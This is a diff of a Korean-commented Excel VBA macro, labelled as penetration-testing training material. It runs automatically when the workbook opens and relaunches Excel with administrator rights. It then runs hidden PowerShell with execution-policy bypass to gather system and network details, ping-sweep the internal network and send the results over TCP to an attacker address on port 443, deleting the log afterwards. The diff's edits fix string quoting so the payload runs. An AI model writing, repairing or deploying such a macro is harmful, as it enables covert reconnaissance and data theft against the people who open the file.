@@ -1,3 +1,8 @@
+' =======================================
+' VBA 정보 수집 및 내부 스캐닝 (443 포트 사용)
+' **합법적인 모의 해킹 교육 및 테스트 목적**
+' =======================================
+
 Sub Auto_Open()
     ' Excel 파일이 열릴 때 자동으로 실행됩니다.
     On Error Resume Next
@@ -12,8 +17,6 @@ Sub Auto_Open()
     Else
         ' 2차 실행: 관리자 권한으로 실행되었으므로 정보를 수집합니다.
         Kill tempFilePath
-        ' 팀장님의 지침에 따라 UAC 영구 비활성화 코드를 제거합니다.
-        ' DisableUAC ' 이 함수는 합법적인 모의 테스트를 위해 제거되었습니다.
         
         PerformInternalScanAndExfiltrate
         
@@ -39,11 +42,6 @@ Private Sub RestartExcelAsAdmin()
     Application.Quit
 End Sub
 
-' ' UAC 비활성화 함수는 보안 가이드라인 준수를 위해 제거되었습니다.
-' Private Sub DisableUAC()
-'    ... (제거됨)
-' End Sub
-
 ' 시스템 정보 수집, 내부 스캐닝 및 데이터 유출 함수 (443 포트)
 Sub PerformInternalScanAndExfiltrate()
     Dim shell As Object
@@ -60,17 +58,17 @@ Sub PerformInternalScanAndExfiltrate()
     
     Set shell = CreateObject("WScript.Shell")
     
-    ' 2. PowerShell 스크립트 작성 (PowerShell 내부에서 모든 것을 처리)
-    ' 관리자 권한으로 실행되므로 Get-ComputerInfo 및 스캐닝이 성공할 가능성이 높습니다.
+    ' 2. PowerShell 스크립트 작성 (문자열 안정화: 내부 문자열은 모두 작은따옴표로 처리)
     
+    ' PowerShell 스크립트의 큰따옴표를 작은따옴표로 모두 변경하여 VBA 문자열 오류를 해결합니다.
     psCommand = "powershell.exe -NoP -NonI -WindowStyle Hidden -Exec Bypass -Command """ & _
                 "$L='" & Log_File & "'; $E='SilentlyContinue';" & _
                 "Add-Content -Path $L -Value '--- Admin System Info ---' -Encoding Default -ErrorAction $E;" & _
                 "Get-ComputerInfo | Select WindowsProductName, OsArchitecture, CsDomain, OsBuildNumber | Format-List | Out-String | Add-Content -Path $L -Encoding Default -ErrorAction $E;" & _
                 "Get-NetIPConfiguration | Out-String | Add-Content -Path $L -Encoding Default -ErrorAction $E;" & _
                 "Add-Content -Path $L -Value '--- Internal Network Scan (192.168/10.x Ping Sweep) ---' -Encoding Default -ErrorAction $E;" & _
-                "$ipPrefix=(Get-NetIPConfiguration | Select-Object IPv4Address | Where-Object { $_.IPv4Address -like '192.168*' -or $_.IPv4Address -like '10*' } | Select-Object -First 1).IPv4Address.Split(\"".\"\")[0..2] -join \".\"; " & _
-                "if ($ipPrefix) { 1..254 | ForEach-Object { $ip=$ipPrefix+'\.' + $_; if(Test-Connection -ComputerName $ip -Count 1 -ErrorAction Ignore -Quiet) { 'Host ' + $ip + ' is UP' | Add-Content -Path $L -Encoding Default } } };" & _
+                "$ipPrefix=(Get-NetIPConfiguration | Select-Object IPv4Address | Where-Object { $_.IPv4Address -like '192.168*' -or $_.IPv4Address -like '10*' } | Select-Object -First 1).IPv4Address.Split('.')[-4,-3,-2] -join '.'; " & _
+                "if ($ipPrefix) { 1..254 | ForEach-Object { $ip=$ipPrefix+'.' + $_; if(Test-Connection -ComputerName $ip -Count 1 -ErrorAction Ignore -Quiet) { 'Host ' + $ip + ' is UP' | Add-Content -Path $L -Encoding Default } } };" & _
                 "try {" & _
                 "  $C=New-Object System.Net.Sockets.TcpClient('" & Attacker_IP & "'," & Attacker_Port & ");" & _
                 "  $S=$C.GetStream();" & _
@@ -81,8 +79,9 @@ Sub PerformInternalScanAndExfiltrate()
                 "} catch {} finally {" & _
                 "  if ($C) {$C.Close()};" & _
                 "  Remove-Item $L -ErrorAction $E;" & _
-                "}"
-    
+                "}" & _
+                """" ' PowerShell 명령 문자열을 닫는 최종 큰따옴표
+
     ' 3. PowerShell 실행 (숨김 모드, 실행 완료 대기)
     shell.Run psCommand, 0, True
     
